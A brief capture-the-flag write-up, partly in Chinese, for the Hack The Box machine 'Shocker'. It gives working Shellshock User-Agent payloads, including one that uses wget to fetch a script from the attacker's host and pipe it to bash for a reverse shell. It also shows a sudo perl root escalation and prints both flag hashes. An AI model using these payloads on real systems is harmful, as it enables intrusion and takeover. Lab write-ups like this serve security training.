# Shocker
- IP : 10.129.213.104
- URL : https://app.hackthebox.eu/machines/108

## Recon
- Rustscan
    - ![](https://i.imgur.com/4BeuvZQ.png)
- nmap 
    - ![](https://i.imgur.com/zj7S9gt.png)
- 觀察首頁
    - ![](https://i.imgur.com/VW19KRW.png)
- 通靈掃到目錄 `/cgi-bin/user.sh`	
    - ![](https://i.imgur.com/iniIUSg.png)

## Shell shock
- 在 User agent 增加
    - `() { :;}; echo; /usr/bin/id`
    - ![](https://i.imgur.com/2iOQw9q.png)
- `User-Agent: () { :;}; echo; /usr/bin/wget 10.10.16.35:8000/s_HTB /tmp/s`
    - 下載 shell
    - ![](https://i.imgur.com/5A2lKtC.png)
- 執行 shell
    - `User-Agent: () { :;}; echo; /usr/bin/wget -O - 10.10.16.35:8000/s_HTB | /bin/bash`
## Reverse shell
- 收 shell
    - ![](https://i.imgur.com/Utt4lst.png)
- Spawn shell
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Get user flag
    - ![](https://i.imgur.com/M4rjd5b.png)
    - `6e9aad0e2498bff702b570c2da380288`
## 提權
- 跑豌豆
    - 
![](https://i.imgur.com/Gfbiuav.png)
- 可以執行 perl
    - `sudo perl -e 'exec "/bin/sh";'`
- 取得 Root Flag
    - ![](https://i.imgur.com/bFTiyzW.png)
    - `e3e05cbd925c9e407215bb26e9b7e47d`